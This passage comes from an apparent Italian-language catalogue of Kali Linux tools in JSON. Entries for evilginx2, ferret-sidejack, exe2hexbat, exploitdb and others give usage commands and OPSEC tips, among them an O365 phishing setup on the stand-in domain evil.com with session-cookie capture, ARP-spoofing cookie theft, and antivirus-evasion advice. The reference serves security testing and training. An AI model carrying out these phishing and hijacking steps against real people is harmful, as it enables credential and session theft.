-Identity admin\n\n# Proxychains per pivoting\nproxychains evil-winrm -i 10.0.0.5 -u admin -H hash</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Post-Exploitation</strong>, shell preferita per Windows dopo initial access.</p><p>Nel <strong>Lateral Movement</strong>, usa PTH per muoversi tra host.</p><p><strong>AD Pentesting</strong> per interazione con DC.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> WinRM logging abilitato di default. PowerShell logging cattura comandi. Considera AMSI bypass per evasion.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Lateral_Movement"
    ],
    "notes": null
  },
  {
    "id": "evilginx2",
    "name": "evilginx2",
    "version": "3.3.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/evilginx2/",
    "desc": "MITM phishing framework che bypassa 2FA catturando session token.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Evilginx2</strong> è un framework di phishing man-in-the-middle che agisce come proxy tra vittima e sito legittimo. Cattura credenziali E session token, bypassando efficacemente la 2FA. La vittima interagisce con il sito reale attraverso il proxy, rendendo l'attacco quasi indistinguibile.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Session Hijacking:</strong> Cattura cookie di sessione post-2FA.</p><p><strong>Transparent Proxy:</strong> Proxy inverso verso il sito reale.</p><p><strong>Phishlet Templates:</strong> Template per O365, Google, LinkedIn, etc.</p><p><strong>SSL Certificates:</strong> Genera certificati Let's Encrypt automaticamente.</p><p><strong>URL Masking:</strong> Crea URL convincenti per le vittime.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Setup completo O365 phishing\nevilginx2 -p /opt/evilginx2/phishlets\n\n: config domain evil.com\n: config ipv4 external 1.2.3.4\n: config ipv4 bind 0.0.0.0\n\n# Configura phishlet O365\n: phishlets hostname o365 login.evil.com\n: phishlets enable o365\n\n# Crea lure con redirect\n: lures create o365\n: lures edit 0 redirect_url https://office.com\n: lures edit 0 info \"IT Security Training\"\n: lures get-url 0\n\n# Blacklist bots e scanner\n: blacklist add ip 1.2.3.4\n: blacklist add useragent *bot*\n\n# Monitoraggio sessioni catturate\n: sessions         # lista tutte\n: sessions 1       # dettaglio sessione\n\n# Export cookie per uso in browser\n: sessions 1\n# Copia cookie JSON -&gt; Cookie-Editor extension\n\n# Phishlets custom per target\nvim /opt/evilginx2/phishlets/custom.yaml\n# Definisci proxy_hosts, sub_filters, auth_tokens</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Red Team</strong>, simula attacchi phishing avanzati.</p><p>Nel <strong>2FA Testing</strong>, dimostra limitazioni di 2FA tradizionale.</p><p><strong>Awareness</strong> per training su phishing sofisticato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> URL sospetto visibile. FIDO2/WebAuthn resistono a questo attacco. Richiede dominio e infrastruttura dedicata.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Social_Engineering"
    ],
    "notes": null
  },
  {
    "id": "exe2hexbat",
    "name": "exe2hexbat",
    "version": "1.5.1",
    "icon": "../app/icons/exe2hexbat-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/exe2hexbat/",
    "desc": "Converte EXE in script batch hex-encoded per trasferimento senza binary.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Exe2hexbat</strong> converte file eseguibili in script batch Windows che ricostruiscono il binario originale usando comandi echo e certutil. Utile quando non puoi trasferire file binari direttamente ma hai accesso a una shell con possibilità di eseguire comandi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Hex Encoding:</strong> Converte binary in hex string.</p><p><strong>Batch Output:</strong> Genera script .bat auto-ricostruente.</p><p><strong>Certutil Decode:</strong> Usa certutil per decodifica sul target.</p><p><strong>Chunk Splitting:</strong> Divide in chunk per evitare limiti di lunghezza.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Converti eseguibile\nexe2hexbat payload.exe output.bat\n\n# Specifica nome output\nexe2hexbat -o reconstructed.exe payload.exe script.bat\n\n# Sul target Windows, copia-incolla o esegui il .bat\nC:\\> script.bat</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>File Transfer</strong>, quando HTTP/SMB non sono disponibili.</p><p>Nel <strong>Restricted Environments</strong>, bypassa filtri su file binari.</p><p><strong>Living off the Land</strong> usando solo comandi nativi Windows.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Pattern certutil -decode è monitorato. Script batch molto lunghi sono sospetti. Considera alternative come PowerShell download.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "Payload_Generation"
    ],
    "notes": null
  },
  {
    "id": "exiflooter",
    "name": "exiflooter",
    "version": "1.0.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/exiflooter/",
    "desc": "Estrae metadati EXIF da immagini trovate online per geolocalizzazione e info sensibili sul target.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>ExifLooter</strong> cerca e analizza automaticamente immagini su siti web target per estrarre metadati EXIF. Può rivelare coordinate GPS, modello camera/telefono, data/ora dello scatto, software usato e altre informazioni sensibili. Utile per OSINT e reconnaissance.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Web Crawling:</strong> Cerca immagini su siti target automaticamente.</p><p><strong>GPS Extraction:</strong> Estrae coordinate di geolocalizzazione.</p><p><strong>Device Info:</strong> Identifica camera/telefono usato.</p><p><strong>Timestamp Analysis:</strong> Recupera date di creazione e modifica.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Analizza sito\nexiflooter -u https://target.com\n\n# Con output JSON\nexiflooter -u https://target.com -o results.json\n\n# Cerca ricorsivamente\nexiflooter -u https://target.com -r -d 3</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT</strong>, trova location da foto postate online.</p><p>Nel <strong>Target Profiling</strong>, identifica device e software usati.</p><p><strong>Privacy Assessment</strong> per verificare esposizione metadata.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Passive:</strong> Operazione principalmente passiva. Molti siti strippano EXIF automaticamente. Social media generalmente rimuovono GPS.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "exploitdb-bin-sploits",
    "name": "exploitdb-bin-sploits",
    "version": "20221122",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/exploitdb-bin-sploits/",
    "desc": "Archivio di exploit binari precompilati pronti all'uso da Exploit-DB per test rapidi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>ExploitDB-bin-sploits</strong> è un archivio di exploit binari precompilati dal database Exploit-DB. Contiene eseguibili pronti all'uso per varie vulnerabilità, evitando la necessità di compilazione. Utile per test rapidi quando serve un exploit funzionante immediatamente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Precompiled:</strong> Binari già compilati per varie piattaforme.</p><p><strong>Indexed:</strong> Organizzati per EDB-ID per facile ricerca.</p><p><strong>Ready to Use:</strong> Nessuna compilazione necessaria.</p><p><strong>Various Platforms:</strong> Windows, Linux, altri OS.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># I binari sono in /usr/share/exploitdb-bin-sploits/\nls /usr/share/exploitdb-bin-sploits/\n\n# Cerca per EDB-ID\nfind /usr/share/exploitdb-bin-sploits/ -name \"*1234*\"\n\n# Copia e usa\ncp /usr/share/exploitdb-bin-sploits/bin-sploits/1234.exe .</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Quick Testing</strong>, exploit pronto senza compilazione.</p><p>Nel <strong>Lab Environment</strong>, testa vulnerabilità rapidamente.</p><p><strong>CTF</strong> quando serve exploit veloce.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Signatures:</strong> Binari pubblici hanno signature AV note. Non usare in engagement reali senza modifica.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "exploitdb-papers",
    "name": "exploitdb-papers",
    "version": "20221122",
    "icon": "../app/icons/exploitdb-papers-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/exploitdb-papers/",
    "desc": "Collezione di whitepaper e documentazione tecnica su vulnerabilità e tecniche di exploit.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>ExploitDB-papers</strong> è una collezione di whitepaper, documentazione tecnica e articoli su vulnerabilità e tecniche di exploit dal database Exploit-DB. Contiene ricerche sulla sicurezza, write-up di exploit e documentazione di tecniche offensive e difensive.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Research Papers:</strong> Whitepaper su vulnerabilità e tecniche.</p><p><strong>Exploit Write-ups:</strong> Documentazione dettagliata di exploit.</p><p><strong>Technique Docs:</strong> Guide su tecniche offensive.</p><p><strong>Searchable:</strong> Indicizzato per facile ricerca.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Papers sono in /usr/share/exploitdb-papers/\nls /usr/share/exploitdb-papers/\n\n# Cerca per keyword\ngrep -r \"buffer overflow\" /usr/share/exploitdb-papers/\n\n# Cerca con searchsploit\nsearchsploit -p papers/keyword</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Research</strong>, documentazione su vulnerabilità specifiche.</p><p>Nel <strong>Learning</strong>, studia tecniche di exploit.</p><p><strong>Reference</strong> durante sviluppo exploit.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Educational:</strong> Risorsa puramente educativa. Utile per capire vulnerabilità prima di testarle.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "exploitdb",
    "name": "exploitdb",
    "version": "20250827",
    "icon": "../app/icons/exploitdb-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/exploitdb/",
    "desc": "Database locale di exploit pubblici con tool searchsploit per ricerca offline rapida.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>ExploitDB</strong> è il database locale del famoso Exploit-DB, contenente migliaia di exploit pubblici, shellcode e proof-of-concept. Include searchsploit, un tool da riga di comando per cercare rapidamente exploit per software, versione o CVE. Database essenziale per ogni pentester.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Searchsploit:</strong> Ricerca rapida nel database locale.</p><p><strong>Offline Access:</strong> Funziona senza connessione internet.</p><p><strong>CVE Search:</strong> Cerca per numero CVE.</p><p><strong>Copy/Mirror:</strong> Copia exploit nella directory corrente.</p><p><strong>Regular Updates:</strong> Aggiornabile con searchsploit -u.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cerca per software con versione esatta\nsearchsploit apache 2.4.49 | grep -i \"remote\\|rce\\|exploit\"\n\n# Cerca CVE con output JSON per automazione\nsearchsploit CVE-2021-44228 --json | jq '.RESULTS_EXPLOIT[].Path'\n\n# Copia exploit in directory corrente\nsearchsploit -m 50383\n\n# Pipeline: nmap version scan -&gt; searchsploit\nnmap -sV target -oX scan.xml\nsearchsploit --nmap scan.xml\n\n# Escludi risultati DOS/denialofservice\nsearchsploit wordpress --exclude=\"dos|Denial\"\n\n# Cerca solo Metasploit modules\nsearchsploit apache -t --id | grep -i metasploit\n\n# Mirror exploit per analisi offline\nsearchsploit -m 50383 -o /tmp/exploits/\n\n# Cerca shellcode\nsearchsploit -s shellcode linux x86\n\n# Aggiorna e verifica ultimo update\nsearchsploit -u &amp;&amp; cat /usr/share/exploitdb/.searchsploit_rc</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Vulnerability Assessment</strong>, cerca exploit per software trovato.</p><p>Nel <strong>Pentest</strong>, trova rapidamente PoC per CVE specifiche.</p><p><strong>Research</strong> per studiare vulnerabilità note.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Public Exploits:</strong> Signature conosciute dagli AV. Modifica exploit prima dell'uso in engagement reali.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "eyewitness",
    "name": "eyewitness",
    "version": "20230525.1",
    "icon": "../app/icons/eyewitness-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/eyewitness/",
    "desc": "Cattura screenshot di siti web, RDP e VNC per visual recon rapida su larga scala.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>EyeWitness</strong> cattura automaticamente screenshot di siti web, server RDP e VNC per permettere visual reconnaissance rapida su larga scala. Genera report HTML navigabile con tutti gli screenshot, identificando tecnologie, titoli e potenziali target interessanti. Essenziale per triage di grandi quantità di host.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Web Screenshots:</strong> Cattura pagine HTTP/HTTPS.</p><p><strong>RDP/VNC Support:</strong> Screenshot anche di servizi desktop remoto.</p><p><strong>HTML Reports:</strong> Report navigabile con filtri.</p><p><strong>Technology Detection:</strong> Identifica CMS, framework, server.</p><p><strong>Nmap Integration:</strong> Accetta output XML di Nmap.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Web screenshot da Nmap con tutti i protocolli\neyewitness -x nmap.xml --web --all-protocols --no-prompt -d ./screenshots/\n\n# Bulk screenshot con threads e delay\neyewitness -f urls.txt --web -t 10 --timeout 30 --delay 2\n\n# RDP e VNC screenshot simultanei\neyewitness -f hosts.txt --rdp --vnc -d ./remote_desktop/\n\n# User-agent custom per evasione\neyewitness -f urls.txt --web --user-agent \"Mozilla/5.0 (Windows NT 10.0)\" \n\n# Con proxy e auth\neyewitness -f urls.txt --web --proxy-ip 127.0.0.1 --proxy-port 8080\n\n# Pipeline completa: subfinder -&gt; httpx -&gt; eyewitness\nsubfinder -d target.com -silent | httpx -silent -o live.txt\neyewitness -f live.txt --web -d ./recon_$(date +%Y%m%d)/\n\n# Cicla su ogni screenshot per default creds check\neyewitness -f urls.txt --web --active-scan\n\n# Resume scan interrotto\neyewitness --resume ./ew_scan/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Reconnaissance</strong>, visual triage di centinaia di web server.</p><p>Nel <strong>Bug Bounty</strong>, identifica rapidamente target interessanti.</p><p><strong>Red Team</strong> per mappare superficie d'attacco visivamente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Active:</strong> Connessioni attive a tutti i target. User-agent identificabile. Genera traffico significativo.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "Visual_Recon"
    ],
    "notes": null
  },
  {
    "id": "fatcat",
    "name": "fatcat",
    "version": "1.1.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/fatcat/",
    "desc": "Tool forense per analizzare e manipolare filesystem FAT12/FAT16/FAT32 a basso livello.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>FatCat</strong> è un tool forense specializzato per analisi a basso livello di filesystem FAT (FAT12, FAT16, FAT32). Permette di esplorare in dettaglio la struttura interna del filesystem, navigare le File Allocation Table, recuperare file cancellati analizzando directory entries orfane, manipolare cluster chain e accedere ai raw sector del disco. È particolarmente utile per digital forensics su supporti rimovibili come chiavette USB, schede SD, memorie di fotocamere e dispositivi embedded che utilizzano ancora filesystem FAT.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>FAT Structure Analysis:</strong> analizza in dettaglio la struttura della File Allocation Table, mostrando allocazione dei cluster, cluster chain, settori riservati e boot sector permettendo di comprendere l'organizzazione fisica dei dati sul supporto.</p><p><strong>Deleted File Recovery:</strong> recupera file cancellati identificando directory entries marcate come deleted (primo byte 0xE5) e ricostruendo i dati dai cluster ancora non sovrascritti, con possibilità di recupero anche di file frammentati.</p><p><strong>Cluster Chain Navigation:</strong> permette navigazione manuale attraverso la chain dei cluster per analizzare la frammentazione dei file, identificare cluster orfani e ricostruire file corrotti seguendo manualmente le allocazioni.</p><p><strong>Raw Sector Access:</strong> accesso diretto ai settori raw del disco per analisi esadecimale, permettendo di esaminare slack space, settori non allocati e dati nascosti non visibili a livello filesystem.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Visualizza info sul filesystem FAT\nfatcat disk.img -i\n\n# Lista contenuto directory root\nfatcat disk.img -l /\n\n# Lista ricorsiva di tutte le directory\nfatcat disk.img -l / -r\n\n# Mostra file cancellati recuperabili\nfatcat disk.img -d\n\n# Recupera file cancellato specifico\nfatcat disk.img -r deleted_file.txt -O recovered.txt\n\n# Estrai file esistente\nfatcat disk.img -x /path/to/file.doc -O extracted.doc\n\n# Analizza cluster chain di un file\nfatcat disk.img -c 1234\n\n# Dump settore raw in esadecimale\nfatcat disk.img -s 0 -n 1</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>USB/SD Card Forensics</strong>, analizzare supporti rimovibili formattati FAT per recuperare file cancellati, analizzare timeline di utilizzo e identificare dati nascosti in slack space.</p><p>Per <strong>Data Recovery</strong>, recuperare file eliminati accidentalmente o intenzionalmente da dispositivi FAT quando i cluster non sono ancora stati sovrascritti.</p><p>Per <strong>Malware Analysis</strong>, analizzare supporti FAT compromessi per identificare file malevoli, payload nascosti e artefatti lasciati da malware su dispositivi rimovibili.</p><p>Per <strong>Embedded Device Analysis</strong>, analizzare filesystem FAT di dispositivi IoT, fotocamere, dashcam e altri device che utilizzano FAT per storage.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Read-Only Operation:</strong> utilizzare sempre su immagini forensi (dd, dcfldd) e mai direttamente su device originali per preservare l'integrità delle prove. Il tool supporta esclusivamente filesystem FAT12/16/32 - per NTFS usare ntfsundelete, per ext usare extundelete. Documentare sempre la chain of custody per analisi forensi legali.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "fern-wifi-cracker",
    "name": "fern-wifi-cracker",
    "version": "3.5",
    "icon": "../app/icons/fern-wifi-cracker-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/fern-wifi-cracker/",
    "desc": "GUI per attacchi WiFi automatizzati: WEP/WPA cracking, WPS attack, session hijacking.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Fern WiFi Cracker è un tool completo con interfaccia grafica per audit e attacchi su reti wireless. Automatizza l'intero processo di cracking WEP/WPA/WPA2, attacchi WPS (Pixie-Dust e brute force), attacchi MITM con ARP poisoning e session hijacking su reti aperte. Scritto in Python con framework Qt, offre un'interfaccia intuitiva che rende accessibili tecniche di wireless penetration testing anche a utenti meno esperti della command line, orchestrando in background tool come aircrack-ng, reaver e ettercap.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Automated WEP Cracking:</strong> esegue automaticamente l'intero processo di attacco WEP inclusi ARP replay, packet injection e statistical cracking con aircrack-ng, recuperando la chiave senza intervento manuale.</p><p><strong>WPA/WPA2 Dictionary Attack:</strong> cattura automaticamente il 4-way handshake tramite deauthentication dei client connessi, poi lancia dictionary attack con wordlist configurabili per tentare il recovery della passphrase.</p><p><strong>WPS PIN Attack:</strong> supporta attacchi WPS inclusi Pixie-Dust (offline, veloce su router vulnerabili) e brute force online del PIN, bypassando completamente la necessità di conoscere la password WPA.</p><p><strong>MITM &amp; Session Hijacking:</strong> integra funzionalità di ARP poisoning per posizionarsi man-in-the-middle e catturare cookie di sessione da traffico HTTP non cifrato per session hijacking su reti aperte o compromesse.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia interfaccia grafica (richiede root)\nsudo fern-wifi-cracker\n\n# Workflow tipico:\n# 1. Seleziona interfaccia wireless dal dropdown\n# 2. Clicca \"Scan for Access Points\" per discovery reti\n# 3. Attendi completamento scan (mostra WEP, WPA, WPS status)\n# 4. Seleziona target dalla lista\n# 5. Per WPA: carica wordlist e clicca \"WiFi Attack\"\n# 6. Per WPS: seleziona \"WPS Attack\" se il target ha WPS enabled\n# 7. Monitora progresso nella finestra principale\n\n# Requisiti:\n# - Scheda wireless con supporto monitor mode\n# - Driver compatibili (ath9k, rt2800usb, etc.)\n# - aircrack-ng suite installata\n# - reaver per attacchi WPS</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WiFi Security Auditing</strong>, condurre assessment automatizzato della sicurezza di reti wireless aziendali o domestiche verificando robustezza delle password e vulnerabilità WPS.</p><p>Per <strong>Learning &amp; Training</strong>, eccellente strumento didattico per imparare i concetti di wireless security e attacchi WiFi attraverso un'interfaccia visuale che mostra ogni fase del processo.</p><p>Per <strong>Quick Penetration Testing</strong>, ottenere risultati rapidi durante engagement quando non è necessario il controllo granulare offerto dai tool command-line.</p><p>Per <strong>Security Demonstrations</strong>, dimostrare visivamente a clienti o management i rischi di password WiFi deboli o WPS abilitato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> tutte le attività wireless (deauth, packet injection, WPS brute force) sono facilmente rilevabili da WIDS enterprise e generano anomalie RF localizzabili. Richiede hardware con chipset compatibile monitor mode e packet injection (Atheros, Ralink consigliati). L'interfaccia GUI richiede display grafico. Usare solo su reti autorizzate con permesso esplicito.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "feroxbuster",
    "name": "feroxbuster",
    "version": "2.11.0",
    "icon": "../app/icons/feroxbuster-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/feroxbuster/",
    "desc": "Content discovery tool velocissimo in Rust con ricorsione automatica e filtri avanzati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Feroxbuster</strong> è un tool di content discovery scritto in Rust, ottimizzato per velocità e affidabilità. Supporta ricorsione automatica, filtri avanzati per status code/dimensioni/parole, backup file detection e resume di scan interrotti. Uno dei fuzzer web più veloci disponibili.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>High Speed:</strong> Scritto in Rust per performance massime.</p><p><strong>Auto-Recursion:</strong> Scansione ricorsiva automatica delle directory trovate.</p><p><strong>Smart Filtering:</strong> Filtra per status, size, words, lines, regex.</p><p><strong>Resume Support:</strong> Riprende scan interrotti da dove lasciato.</p><p><strong>Backup Detection:</strong> Cerca automaticamente file di backup.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan completo con auto-tune e resume\nferoxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \\\n  -x php,bak,old,html,txt,zip --auto-tune -o ferox_results.txt --resume-from ferox.state\n\n# Filtra per size e status, ignora errori\nferoxbuster -u https://target.com -C 404,403,500 -S 0 --filter-similar-to \"Page not found\"\n\n# Ricorsione limitata con depth\nferoxbuster -u https://target.com -d 3 --dont-scan /logout,/signout\n\n# Con headers e cookie autenticazione\nferoxbuster -u https://target.com -H \"Authorization: Bearer TOKEN\" \\\n  -H \"Cookie: session=abc123\" -b \"PHPSESSID=xyz789\"\n\n# Parallel scan di multipli URL\nferoxbuster --stdin &lt; urls.txt -w wordlist.txt --parallel 5\n\n# Backup file detection avanzato\nferoxbuster -u https://target.com --collect-backups --collect-extensions\n\n# JSON output per integrazione\nferoxbuster -u https://target.com --json -o results.json\n\n# Via proxy per Burp analysis\nferoxbuster -u https://target.com -p http://127.0.0.1:8080 -k</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Content Discovery</strong>, trova file e directory nascosti velocemente.</p><p>Nel <strong>Bug Bounty</strong>, scansione rapida di grandi scope.</p><p><strong>Pentest</strong> per enumerazione web completa.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Noisy:</strong> Genera molte request, facilmente loggabile. Rate limiting consigliato su target di produzione.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "ferret-sidejack",
    "name": "ferret-sidejack",
    "version": "3.0.1",
    "icon": "../app/icons/ferret-sidejack-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ferret-sidejack/",
    "desc": "Estrae cookie di sessione dal traffico di rete per session hijacking attacks.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Ferret è uno sniffer di rete specializzato nell'estrazione automatica di cookie di sessione dal traffico HTTP non cifrato. Parte del toolkit Sidejack originariamente sviluppato da Robert Graham, cattura passivamente cookie trasmessi in chiaro sulla rete per permettere attacchi di session hijacking (sidejacking). Utilizzato in combinazione con il proxy Hamster, permette di impersonare le sessioni web catturate senza conoscere le credenziali dell'utente. Sebbene l'adozione diffusa di HTTPS ne abbia ridotto l'efficacia, rimane uno strumento didattico importante per dimostrare i rischi delle connessioni non cifrate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Passive Cookie Sniffing:</strong> cattura in modo completamente passivo i cookie trasmessi in header HTTP Set-Cookie e Cookie, senza generare traffico di rete che potrebbe essere rilevato, identificando automaticamente session token di siti popolari.</p><p><strong>Session Token Extraction:</strong> estrae e categorizza session ID, authentication token e altri cookie sensibili identificando il servizio di appartenenza (Gmail, Facebook, Yahoo, etc.) per facilitare il targeting dell'hijacking.</p><p><strong>PCAP Analysis Support:</strong> oltre alla cattura live, analizza file PCAP preesistenti permettendo estrazione offline di sessioni da catture effettuate con altri tool come tcpdump o Wireshark.</p><p><strong>Hamster Proxy Integration:</strong> output formattato per integrazione seamless con il proxy Hamster che permette di iniettare i cookie catturati nel browser dell'attaccante per impersonare le sessioni senza re-autenticazione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cattura live su interfaccia di rete\nferret -i eth0\n\n# Analisi di file PCAP esistente\nferret -r captured_traffic.pcap\n\n# Output in formato Hamster\nferret -i eth0 -o cookies.txt\n\n# Workflow completo di session hijacking:\n# 1. Posizionati sulla rete (stesso segmento o MITM)\n# 2. Avvia cattura con Ferret\nferret -i eth0 -o cookies.txt\n\n# 3. In altra shell, avvia Hamster proxy\nhamster\n\n# 4. Configura browser per usare proxy localhost:1234\n# 5. Naviga a http://hamster per vedere sessioni catturate\n# 6. Clicca su sessione per impersonarla\n\n# Combinazione con ARP spoofing per MITM\narpspoof -i eth0 -t victim_ip gateway_ip &amp;\nferret -i eth0 -o cookies.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Session Hijacking Demonstration</strong>, dimostrare praticamente come un attaccante sulla stessa rete può impersonare sessioni utente quando il traffico non è cifrato con HTTPS.</p><p>Per <strong>Public WiFi Security Testing</strong>, verificare e dimostrare i rischi di utilizzo di reti WiFi pubbliche non protette dove il traffico può essere intercettato da qualsiasi utente connesso.</p><p>Per <strong>Security Awareness Training</strong>, strumento visuale ed efficace per training sulla sicurezza, mostrando concretamente perché HTTPS è essenziale e perché evitare reti pubbliche per attività sensibili.</p><p>Per <strong>Legacy Application Assessment</strong>, identificare applicazioni web aziendali che ancora non implementano HTTPS e trasmettono session cookie in chiaro.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Limitazioni:</strong> completamente inefficace contro traffico HTTPS/TLS che rappresenta ormai la maggioranza del web. Richiede posizione sulla rete (stesso segmento broadcast) o setup MITM attivo (ARP spoofing). Tool datato ma ancora valido per dimostrazioni didattiche e testing di applicazioni legacy. I cookie con flag Secure non vengono trasmessi su HTTP plain.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "ffuf",
    "name": "ffuf",
    "version": "2.1.0",
    "icon": "../app/icons/ffuf-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ffuf/",
    "desc": "Fuzzer web velocissimo in Go per directory, parametri, vhost e qualsiasi punto di injection.",
